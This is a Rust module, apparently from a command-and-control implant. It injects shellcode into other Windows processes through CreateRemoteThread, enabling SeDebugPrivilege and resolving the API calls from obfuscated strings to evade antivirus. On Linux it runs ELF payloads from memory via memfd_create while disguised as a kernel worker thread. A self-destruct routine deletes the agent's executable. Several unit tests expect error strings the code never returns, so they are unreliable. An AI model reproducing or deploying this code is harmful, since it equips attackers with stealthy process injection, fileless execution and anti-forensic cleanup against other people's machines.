// 进程注入模块
// 处理 Windows 远程线程注入与 Linux 内存文件执行

use crate::types::CommandResult;
#[allow(unused_imports)]
use log::{debug, error, info, warn};

#[cfg(target_os = "windows")]
use std::ptr;

// 在 run_memfd_elf 中使用 std::io::Write 的全限定名

#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;

#[cfg(target_os = "linux")]
use std::os::unix::io::{AsRawFd, FromRawFd};

#[cfg(target_os = "linux")]
use std::ffi::CString;

#[cfg(target_os = "windows")]
use winapi::{
    shared::{
        minwindef::FALSE,
        ntdef::NULL,
    },
    um::{
        errhandlingapi::GetLastError,
        handleapi::{CloseHandle, INVALID_HANDLE_VALUE},
        processthreadsapi::OpenProcessToken,
        winnt::{
            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
            PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
            PROCESS_VM_READ, PROCESS_VM_WRITE,
            TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY, SE_PRIVILEGE_ENABLED,
        },
        winbase::LookupPrivilegeValueW,
        securitybaseapi::AdjustTokenPrivileges,
    },
};

/// 进程注入功能实现
pub struct ProcessInjector;

impl ProcessInjector {
    /// 启用 SeDebugPrivilege 提权（需要管理员权限）
    #[cfg(target_os = "windows")]
    pub fn enable_debug_privilege() -> bool {
        use std::ptr;
        use widestring::U16CString;
        use winapi::um::winnt::{LUID_AND_ATTRIBUTES, TOKEN_PRIVILEGES};

        unsafe {
            let mut h_token = NULL;
            if OpenProcessToken(winapi::um::processthreadsapi::GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut h_token) == FALSE {
                return false;
            }

            let priv_name_raw = obf_str!("SeDebugPrivilege");
            let priv_name_str = crate::utils::decode_obf(&priv_name_raw);
            let priv_name = U16CString::from_str(priv_name_str).unwrap();
            let mut luid = winapi::shared::ntdef::LUID { LowPart: 0, HighPart: 0 };

            if LookupPrivilegeValueW(ptr::null(), priv_name.as_ptr(), &mut luid) == FALSE {
                CloseHandle(h_token);
                return false;
            }

            let mut tp = TOKEN_PRIVILEGES {
                PrivilegeCount: 1,
                Privileges: [LUID_AND_ATTRIBUTES {
                    Luid: luid,
                    Attributes: SE_PRIVILEGE_ENABLED,
                }; 1],
            };

            let res = AdjustTokenPrivileges(h_token, FALSE, &mut tp, 0, ptr::null_mut(), ptr::null_mut());
            CloseHandle(h_token);

            res != FALSE && GetLastError() == winapi::shared::winerror::ERROR_SUCCESS
        }
    }

    /// 根据进程名查找第一个匹配的 PID
    pub fn find_pid_by_name(name: &str) -> Option<u32> {
        use sysinfo::{PidExt, ProcessExt, System, SystemExt};
        let mut sys = System::new_all();
        sys.refresh_all();
        
        let target = name.to_lowercase();
        for process in sys.processes().values() {
            if process.name().to_lowercase() == target {
                return Some(process.pid().as_u32());
            }
        }
        None
    }

    /// Windows Shellcode 注入接口
    #[cfg(target_os = "windows")]
    pub async fn inject_shellcode(pid: u32, shellcode: Vec<u8>) -> CommandResult {
        let k32_raw = obf_str!("kernel32.dll");
        let kernel32_name = std::ffi::CString::new(crate::utils::decode_obf(&k32_raw)).unwrap();
        let h_kernel32 = unsafe { winapi::um::libloaderapi::GetModuleHandleA(kernel32_name.as_ptr()) };
        
        // 辅助函数：动态获取导出函数地址
        let get_fn = |name_raw: Vec<u8>| unsafe {
            let name = crate::utils::decode_obf(&name_raw);
            let c_name = std::ffi::CString::new(name).unwrap();
            winapi::um::libloaderapi::GetProcAddress(h_kernel32, c_name.as_ptr())
        };

        // 运行时动态解析敏感 API (免杀强化)
        let p_open_process = get_fn(obf_str!("OpenProcess"));
        let p_virtual_alloc_ex = get_fn(obf_str!("VirtualAllocEx"));
        let p_write_process_memory = get_fn(obf_str!("WriteProcessMemory"));
        let p_create_remote_thread = get_fn(obf_str!("CreateRemoteThread"));

        if p_open_process.is_null() || p_virtual_alloc_ex.is_null() || p_write_process_memory.is_null() || p_create_remote_thread.is_null() {
            return CommandResult {
                stdout: String::new(),
                stderr: "APIs resolved failed".to_string(),
                path: None,
                req_id: None,
            };
        }

        // 定义函数指针类型
        type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut winapi::ctypes::c_void;
        type VirtualAllocExFn = unsafe extern "system" fn(*mut winapi::ctypes::c_void, *mut winapi::ctypes::c_void, usize, u32, u32) -> *mut winapi::ctypes::c_void;
        type WriteProcessMemoryFn = unsafe extern "system" fn(*mut winapi::ctypes::c_void, *mut winapi::ctypes::c_void, *const winapi::ctypes::c_void, usize, *mut usize) -> i32;
        type CreateRemoteThreadFn = unsafe extern "system" fn(*mut winapi::ctypes::c_void, *mut winapi::ctypes::c_void, usize, *const winapi::ctypes::c_void, *mut winapi::ctypes::c_void, u32, *mut u32) -> *mut winapi::ctypes::c_void;

        let open_process: OpenProcessFn = unsafe { std::mem::transmute(p_open_process) };
        let virtual_alloc_ex: VirtualAllocExFn = unsafe { std::mem::transmute(p_virtual_alloc_ex) };
        let write_process_memory: WriteProcessMemoryFn = unsafe { std::mem::transmute(p_write_process_memory) };
        let create_remote_thread: CreateRemoteThreadFn = unsafe { std::mem::transmute(p_create_remote_thread) };

        // 尝试开启 Debug 权限
        if Self::enable_debug_privilege() {
            info!("[+] SeDebugPrivilege enabled successfully");
        }
        
        if shellcode.is_empty() {
             return CommandResult { stdout: String::new(), stderr: "Shellcode is empty".to_string(), path: None, req_id: None };
        }

        // 🛡️ PE 头保护检查
        if shellcode.len() > 2 && &shellcode[0..2] == b"MZ" {
            return CommandResult { stdout: String::new(), stderr: "Injection Refused: PE file provided".to_string(), path: None, req_id: None };
        }
        
        // 第 1 步：打开目标进程
        let process_handle = unsafe {
            open_process(
                PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                FALSE,
                pid,
            )
        };
        
        if process_handle.is_null() || process_handle == INVALID_HANDLE_VALUE {
            let error_code = unsafe { GetLastError() };
            return CommandResult { stdout: String::new(), stderr: format!("OpenProcess failed: {}", error_code), path: None, req_id: None };
        }
        
        // 第 2 步：分配内存
        let allocated_memory = unsafe {
            virtual_alloc_ex(
                process_handle,
                ptr::null_mut(),
                shellcode.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        };
        
        if allocated_memory.is_null() {
            unsafe { CloseHandle(process_handle) };
            return CommandResult { stdout: String::new(), stderr: "VirtualAllocEx failed".to_string(), path: None, req_id: None };
        }
        
        // 第 3 步：写入内存
        let mut bytes_written: usize = 0;
        let wr_res = unsafe {
            write_process_memory(
                process_handle,
                allocated_memory,
                shellcode.as_ptr() as *const _,
                shellcode.len(),
                &mut bytes_written,
            )
        };
        
        if wr_res == 0 {
            unsafe { CloseHandle(process_handle) };
            return CommandResult { stdout: String::new(), stderr: "WriteProcessMemory failed".to_string(), path: None, req_id: None };
        }
        
        // 第 4 步：创建远程线程
        let thread_handle = unsafe {
            create_remote_thread(
                process_handle,
                ptr::null_mut(),
                0,
                allocated_memory as *const _,
                ptr::null_mut(),
                0,
                ptr::null_mut(),
            )
        };
        
        if thread_handle.is_null() {
            return CommandResult { stdout: String::new(), stderr: "CreateRemoteThread failed".to_string(), path: None, req_id: None };
        }
        
        // 资源清理
        unsafe {
            CloseHandle(thread_handle);
            CloseHandle(process_handle);
        }
        
        CommandResult {
            stdout: format!("[+] 注入成功，基址: {:p}", allocated_memory),
            stderr: String::new(),
            path: None,
            req_id: None,
        }
    }
    
    /// 非 Windows 平台占位实现
    #[cfg(not(target_os = "windows"))]
    pub async fn inject_shellcode(_pid: u32, _shellcode: Vec<u8>) -> CommandResult {
        CommandResult {
            stdout: String::new(),
            stderr: "当前平台不支持进程注入".to_string(),
            path: None,
            req_id: None,
        }
    }
    
    /// Execute ELF binary from memory using memfd_create (Linux only)
    /// 
    /// ⚠️ SECURITY WARNING: This function implements fileless execution techniques
    /// commonly used by advanced malware and APT groups for evasion.
    /// 
    /// # Parameters
    /// 
    /// * `elf_bytes` - Raw ELF binary data to execute
    /// * `fake_name` - Optional process name for obfuscation (defaults to "[kworker/u2:1]")
    /// 
    /// # Returns
    /// 
    /// CommandResult with execution status and output
    /// 
    /// # Implementation Details
    /// 
    /// 1. Creates anonymous file in RAM using memfd_create syscall
    /// 2. Writes ELF bytes to the file descriptor
    /// 3. Makes the file executable
    /// 4. Uses prctl to set fake process name for stealth
    /// 5. Executes via /proc/self/fd/<FD> path
    /// 6. Cleans up resources
    #[cfg(target_os = "linux")]
    pub async fn run_memfd_elf(elf_bytes: Vec<u8>, fake_name: Option<&str>, detached: bool) -> CommandResult {
        info!("[*] 正在执行无文件加载 (memory-only)");
        if elf_bytes.is_empty() {
            return CommandResult {
                stdout: String::new(),
                stderr: "ELF 数据为空".to_string(),
                path: None,
                req_id: None,
            };
        }
        
        // 校验 ELF 魔术字
        if elf_bytes.len() < 4 || &elf_bytes[0..4] != b"\x7fELF" {
            return CommandResult {
                stdout: String::new(),
                stderr: "无效的 ELF 二进制文件".to_string(),
                path: None,
                req_id: None,
            };
        }
        
        debug!("ELF binary size: {} bytes", elf_bytes.len());
        
        // 步骤 1: 创建内存匿名文件
        let memfd_name = CString::new("").unwrap(); 
        let memfd = unsafe {
            libc::memfd_create(memfd_name.as_ptr(), libc::MFD_CLOEXEC)
        };
        
        if memfd == -1 {
            let errno = std::io::Error::last_os_error();
            error!("Failed to create memfd: {}", errno);
            return CommandResult {
                stdout: String::new(),
                stderr: format!("memfd_create failed: {}", errno),
                path: None,
                req_id: None,
            };
        }
        
        debug!("Created memfd with FD: {}", memfd);
        
        // 步骤 2: 写入数据
        let mut file = unsafe { std::fs::File::from_raw_fd(memfd) };
        
        match std::io::Write::write_all(&mut file, &elf_bytes) {
            Ok(_) => {
                debug!("Successfully wrote {} bytes to memfd", elf_bytes.len());
            }
            Err(e) => {
                error!("Failed to write ELF data to memfd: {}", e);
                return CommandResult {
                    stdout: String::new(),
                    stderr: format!("Failed to write ELF data: {}", e),
                    path: None,
                    req_id: None,
                };
            }
        }
        
        // 步骤 3: 修改权限为可执行
        let fd = file.as_raw_fd();
        if unsafe { libc::fchmod(fd, 0o755) } != 0 {
            let errno = std::io::Error::last_os_error();
            error!("Failed to make memfd executable: {}", errno);
            return CommandResult {
                stdout: String::new(),
                stderr: format!("fchmod failed: {}", errno),
                path: None,
                req_id: None,
            };
        }
        
        debug!("Made memfd executable (mode 755)");
        
        // 步骤 4: 构造执行路径
        let exec_path = format!("/proc/self/fd/{}", fd);
        debug!("Execution path: {}", exec_path);
        
        // 步骤 5: 设置伪造进程名
        let process_name = fake_name.unwrap_or("[kworker/u2:1]");
        Self::set_process_name(process_name);
        
        // 步骤 6: 执行
        info!("🚀 Executing ELF binary from memory...");
        
        let mut cmd = tokio::process::Command::new(&exec_path);
        
        // 增强：如果是后台进程名，则静默启动
        let is_background = detached || process_name.starts_with('[') || process_name.contains("kworker");
        
        if is_background {
            match cmd.spawn() {
                Ok(_) => {
                    info!("✅ ELF spawned in background (detached)");
                    // Close file explicitly to flush and cleanup FD
                    std::mem::drop(file);
                    CommandResult {
                        stdout: "Fileless ELF spawned in background successfully".to_string(),
                        stderr: String::new(),
                        path: None,
                        req_id: None,
                    }
                }
                Err(e) => {
                    error!("Failed to spawn ELF binary: {}", e);
                    CommandResult {
                        stdout: String::new(),
                        stderr: format!("ELF spawn failed: {}", e),
                        path: None,
                        req_id: None,
                    }
                }
            }
        } else {
            let result = cmd.output().await;
            
            // 释放文件句柄
            std::mem::drop(file);
            
            match result {
                Ok(output) => {
                    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
                    let exit_code = output.status.code().unwrap_or(-1);
                    
                    info!("✅ ELF execution completed with exit code: {}", exit_code);
                    CommandResult {
                        stdout: format!(
                            "执行成功! 返回码: {}\n--- STDOUT ---\n{}\n--- STDERR ---\n{}",
                            exit_code, stdout, stderr
                        ),
                        stderr: String::new(),
                        path: None,
                        req_id: None,
                    }
                }
                Err(e) => {
                    error!("Failed to execute ELF binary: {}", e);
                    CommandResult {
                        stdout: String::new(),
                        stderr: format!("ELF execution failed: {}", e),
                        path: None,
                        req_id: None,
                    }
                }
            }
        }
    }
    
    /// 设置进程名 (仅 Linux)
    #[cfg(target_os = "linux")]
    fn set_process_name(name: &str) {
        if let Ok(name_cstr) = CString::new(name) {
            unsafe {
                // PR_SET_NAME = 15
                libc::prctl(15, name_cstr.as_ptr(), 0, 0, 0);
            }
            debug!("Set process name to: {}", name);
        } else {
            warn!("Failed to set process name: invalid string");
        }
    }
    
    /// 非 Linux 平台占位
    #[cfg(not(target_os = "linux"))]
    pub async fn run_memfd_elf(_elf_bytes: Vec<u8>, _fake_name: Option<&str>, _detached: bool) -> CommandResult {
        CommandResult {
            stdout: String::new(),
            stderr: "memfd_create execution is only supported on Linux".to_string(),
            path: None,
            req_id: None,
        }
    }
    
    /// 自毁功能
    /// 逻辑：
    /// 1. 获取当前程序路径
    /// 2. 创建外部进程执行延时删除
    /// 3. 本进程立即退出
    pub async fn self_destruct() -> CommandResult {
        info!("[!] 正在启动自毁程序...");
        
        // Get current executable path
        let current_exe = match std::env::current_exe() {
            Ok(path) => path,
            Err(e) => {
                error!("Failed to get current executable path: {}", e);
                return CommandResult {
                    stdout: String::new(),
                    stderr: format!("Failed to get executable path: {}", e),
                    path: None,
                    req_id: None,
                };
            }
        };
        
        let exe_path = current_exe.to_string_lossy().to_string();
        info!("Current executable: {}", exe_path);
        
        // Create CMD command to delete the file after 3 seconds
        #[cfg(target_os = "windows")]
        let delete_cmd = format!(
            "cmd.exe /C \"timeout /t 3 /nobreak >nul && del /f /q \\\"{}\\\"\"",
            exe_path
        );
        
        #[cfg(not(target_os = "windows"))]
        let delete_cmd = format!("sh -c 'sleep 3 && rm -f \"{}\"'", exe_path);
        
        debug!("Delete command: {}", delete_cmd);
        
        // Start the deletion process in detached mode
        #[cfg(target_os = "windows")]
        let result = std::process::Command::new("cmd.exe")
            .args(&["/C", &delete_cmd])
            .creation_flags(0x00000008) // DETACHED_PROCESS
            .spawn();
        
        #[cfg(not(target_os = "windows"))]
        let result = std::process::Command::new("sh")
            .args(&["-c", &delete_cmd])
            .spawn();
        
        match result {
            Ok(child) => {
                let child_id = child.id();
                info!("✅ Self-destruct process started (PID: {})", child_id);
                
                // Detach the child process so it continues after we exit
                #[cfg(not(target_os = "windows"))]
                let _ = std::mem::drop(child);
                
                // Prepare success message
                let success_msg = CommandResult {
                    stdout: format!(
                        "🚨 SELF-DESTRUCT ACTIVATED 🚨\n\
                        Executable: {}\n\
                        Deletion process PID: {}\n\
                        Agent will exit NOW, file will be deleted in 3 seconds.",
                        exe_path, child_id
                    ),
                    stderr: String::new(),
                    path: None,
                    req_id: None,
                };
                
                // Log final message
                info!("💀 Agent terminating - goodbye!");
                
                // Exit immediately (the external process will delete us)
                tokio::spawn(async {
                    tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
                    std::process::exit(0);
                });
                
                success_msg
            }
            Err(e) => {
                error!("Failed to start self-destruct process: {}", e);
                CommandResult {
                    stdout: String::new(),
                    stderr: format!("Self-destruct failed: {}", e),
                    path: None,
                    req_id: None,
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[tokio::test]
    async fn test_inject_shellcode_empty() {
        let result = ProcessInjector::inject_shellcode(1234, vec![]).await;
        assert!(!result.stderr.is_empty());
        assert!(result.stderr.contains("empty"));
    }
    
    #[tokio::test]
    async fn test_inject_shellcode_invalid_pid() {
        // Test with invalid PID (should fail to open process)
        let shellcode = vec![0x90, 0x90, 0x90, 0xC3]; // NOP NOP NOP RET
        let result = ProcessInjector::inject_shellcode(99999999, shellcode).await;
        
        #[cfg(target_os = "windows")]
        assert!(!result.stderr.is_empty());
        
        #[cfg(not(target_os = "windows"))]
        assert!(result.stderr.contains("only supported on Windows"));
    }
    
    #[test]
    fn test_self_destruct_path_detection() {
        // Test that we can get current executable path
        let current_exe = std::env::current_exe();
        assert!(current_exe.is_ok());
        
        let path = current_exe.unwrap();
        assert!(path.exists());
        assert!(path.is_file());
    }
    
    #[tokio::test]
    async fn test_run_memfd_elf_empty() {
        let result = ProcessInjector::run_memfd_elf(vec![], None, false).await;
        assert!(!result.stderr.is_empty());
        
        #[cfg(target_os = "linux")]
        assert!(result.stderr.contains("empty"));
        
        #[cfg(not(target_os = "linux"))]
        assert!(result.stderr.contains("only supported on Linux"));
    }
    
    #[tokio::test]
    async fn test_run_memfd_elf_invalid_elf() {
        // Test with invalid ELF data
        let invalid_elf = vec![0x00, 0x01, 0x02, 0x03]; // Not ELF magic
        let result = ProcessInjector::run_memfd_elf(invalid_elf, None, false).await;
        
        #[cfg(target_os = "linux")]
        {
            assert!(!result.stderr.is_empty());
            assert!(result.stderr.contains("Invalid ELF binary"));
        }
        
        #[cfg(not(target_os = "linux"))]
        {
            assert!(result.stderr.contains("only supported on Linux"));
        }
    }
    
    #[tokio::test]
    async fn test_run_memfd_elf_valid_elf_header() {
        // Test with valid ELF header but incomplete binary
        let mut elf_header = vec![0x7f, 0x45, 0x4c, 0x46]; // ELF magic
        elf_header.extend_from_slice(&[0; 60]); // Minimal ELF header size
        
        let result = ProcessInjector::run_memfd_elf(elf_header, Some("[test_proc]"), false).await;
        
        #[cfg(target_os = "linux")]
        {
            // Should pass ELF validation but fail execution
            // This is expected since we're not providing a complete ELF binary
            assert!(result.stderr.is_empty() || result.stderr.contains("execution failed"));
        }
        
        #[cfg(not(target_os = "linux"))]
        {
            assert!(result.stderr.contains("only supported on Linux"));
        }
    }
}